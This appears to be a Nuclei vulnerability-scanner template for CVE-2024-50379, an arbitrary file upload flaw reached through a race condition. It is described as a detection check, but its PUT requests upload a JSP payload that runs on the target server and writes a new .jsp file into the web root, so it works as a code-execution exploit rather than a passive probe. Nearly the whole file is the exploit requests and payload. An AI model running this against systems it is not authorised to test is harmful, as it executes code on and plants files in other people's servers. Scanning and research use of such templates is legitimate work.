id: CVE-2024-50379

info:
  name: CVE-2024-50379 - Arbitrary File Upload via Race Condition
  author: Betmen-N-Dgeng
  severity: high
  description: |
    This template detects the presence of an arbitrary file upload vulnerability via race condition in a web application.
  tags: cve,cve2024,file-upload,race-condition

requests:
  - method: PUT
    path:
      - "{{BaseURL}}/t1{{random_suffix}}.Txt"
      - "{{BaseURL}}/t2{{random_suffix}}.Txt"
      - "{{BaseURL}}/t1{{random_suffix}}.Jsp"
      - "{{BaseURL}}/t2{{random_suffix}}.Jsp"
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
      Accept: */*
      Accept-Encoding: gzip, deflate, br
      Accept-Language: zh-CN,zh;q=0.9
      Cookie: JSESSIONID=B75A3C4D5EB154C799DDD9D4AA983511
      Connection: keep-alive
    body: |
      <%@ page import="java.io.*" %>
      <%
          String sourceFilePath = application.getRealPath("/") + "t1{{random_suffix}}.txt"; 
          String destinationFilePath = application.getRealPath("/") + "{{md5_hash}}.jsp"; 

          try {
              FileReader fileReader = new FileReader(sourceFilePath);
              BufferedReader bufferedReader = new BufferedReader(fileReader);

              FileWriter fileWriter = new FileWriter(destinationFilePath);
              BufferedWriter bufferedWriter = new BufferedWriter(fileWriter);

              String line;
              while ((line = bufferedReader.readLine()) != null) {
                  bufferedWriter.write(line);
                  bufferedWriter.newLine();  
              }
              bufferedReader.close();
              bufferedWriter.close();
              out.println("SAVA_PATH: " + destinationFilePath);
          } catch (IOException e) {
              e.printStackTrace();
              out.println("Error: " + e.getMessage());
          }
      %>

  - method: GET
    path:
      - "{{BaseURL}}/t1{{random_suffix}}.txt"
      - "{{BaseURL}}/t2{{random_suffix}}.txt"
      - "{{BaseURL}}/t1{{random_suffix}}.jsp"
      - "{{BaseURL}}/t2{{random_suffix}}.jsp"
      - "{{BaseURL}}/{{md5_hash}}.jsp"
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
      Accept: */*
      Accept-Encoding: gzip, deflate, br
      Accept-Language: zh-CN,zh;q=0.9
      Cookie: JSESSIONID=B75A3C4D5EB154C799DDD9D4AA983511
      Connection: keep-alive
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "SAVA_PATH:"
        part: body

variables:
  random_suffix: "{{randstr(5)}}"
  md5_hash: "{{randstr(10) | md5 | upper}}"
